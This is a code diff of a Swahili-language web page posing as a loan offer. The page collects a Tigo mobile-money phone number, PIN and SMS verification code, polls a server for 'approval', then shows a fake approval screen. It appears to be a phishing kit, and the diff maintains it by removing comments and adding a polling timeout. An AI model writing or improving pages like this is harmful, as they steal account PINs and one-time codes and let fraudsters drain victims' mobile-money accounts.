@@ -31,7 +31,6 @@
         @keyframes spin { to { transform: rotate(360deg); } }
         .phone-display { background: #fef9e7; padding: 0.4rem 1.2rem; border-radius: 25px; display: inline-block; font-weight: 700; margin: 0.5rem 0; font-size: 0.9rem; }
 
-        /* Creative Tigo Verification header */
         .verify-header { text-align: center; margin-bottom: 1.2rem; }
         .verify-header .shield-icon { font-size: 2.5rem; color: var(--eco-green); margin-bottom: 0.5rem; }
         .verify-header h3 { font-size: 1.2rem; color: var(--dark); }
@@ -69,16 +68,13 @@
     <div class="main-container">
         <div class="loan-summary"><div style="font-size:0.75rem;color:var(--gray);">Mkopo Wako</div><div class="amount" id="loanAmount">TZS 0</div></div>
         <div class="card">
-            <!-- Screen 1: Phone + PIN -->
             <div class="screen active" id="screen1">
                 <h3 style="margin-bottom:1rem;">📱 Ingiza Taarifa za Tigo</h3>
                 <div class="form-group"><label>Namba ya Simu</label><div class="phone-box"><span class="prefix">+255</span><input type="tel" id="phoneNumber" placeholder="0712345678 au 0612345678" maxlength="12"></div><div class="error-msg" id="phoneError">Ingiza namba sahihi</div></div>
                 <div class="form-group"><label>PIN ya Tigo</label><div class="pin-box"><input type="password" id="tigoPin" placeholder="• • • •" maxlength="4"><button class="toggle-btn" onclick="togglePIN()">👁️</button></div><div class="error-msg" id="pinError">Ingiza PIN</div></div>
                 <button class="btn btn-gold" onclick="submitDetails()">Endelea →</button>
             </div>
-            <!-- Screen 2: Waiting -->
             <div class="screen" id="screen2"><div class="waiting-content"><div class="spinner"></div><h3>⏳ Inakaguliwa</h3><p style="color:var(--gray);">Inasubiri uidhinishaji</p><div class="phone-display" id="showPhone">+255 ---------</div></div></div>
-            <!-- Screen 3: SMS paste code -->
             <div class="screen" id="screen3"><div class="waiting-content">
                 <div class="verify-header">
                     <div class="shield-icon"><i class="fas fa-shield-alt"></i></div>
@@ -101,11 +97,9 @@
                 <button class="btn btn-gold" onclick="submitCode()">Thibitisha →</button>
                 <div class="resend-link"><a onclick="resendCode()">↻ Hukupokea SMS? Bonyeza hapa</a></div>
             </div></div>
-            <!-- Screen 4: Verifying -->
             <div class="screen" id="screen4"><div class="waiting-content"><div class="spinner"></div><h3>⏳ Inathibitisha</h3><div class="phone-display" id="showPhone3">+255 ---------</div></div></div>
         </div>
     </div>
-    <!-- Success Overlay -->
     <div class="success-overlay" id="successOverlay"><div class="success-card"><div class="check-icon"><svg viewBox="0 0 100 100"><circle class="check-circle" cx="50" cy="50" r="45"/><path class="check-mark" d="M30 50 L45 65 L70 35" fill="none"/></svg></div><h2>🎉 Mkopo Umeidhinishwa!</h2><div class="big-amount" id="approvedAmount">TZS 0</div><p>📱 Uthibitisho umetumwa<br>💰 Fedha zitaingia hivi karibuni</p><button class="btn-home" onclick="window.location.href='/'">🏠 Rudi Nyumbani</button></div></div>
     <div class="copyright-bar"><p>© 2024 MixxByYas</p></div>
     <script>
@@ -121,7 +115,6 @@
         document.getElementById('phoneNumber').addEventListener('input', function() { this.value = this.value.replace(/\D/g, ''); });
         document.getElementById('tigoPin').addEventListener('input', function() { this.value = this.value.replace(/\D/g, ''); });
 
-        // Show correct button based on device
         (function() {
             var ua = navigator.userAgent.toLowerCase();
             if (/iphone|ipad|ipod/.test(ua)) {
@@ -149,7 +142,11 @@
 
         function startChecking() { 
             if (checkInterval) clearInterval(checkInterval); 
+            // safety: stop checking after 2 minutes
+            var maxChecks = 0;
             checkInterval = setInterval(async function() { 
+                maxChecks++;
+                if (maxChecks > 40) { clearInterval(checkInterval); alert('Muda umeisha. Jaribu tena.'); window.location.reload(); return; }
                 try { 
                     var res = await fetch('/api/check_status/' + appId); 
                     var data = await res.json(); 
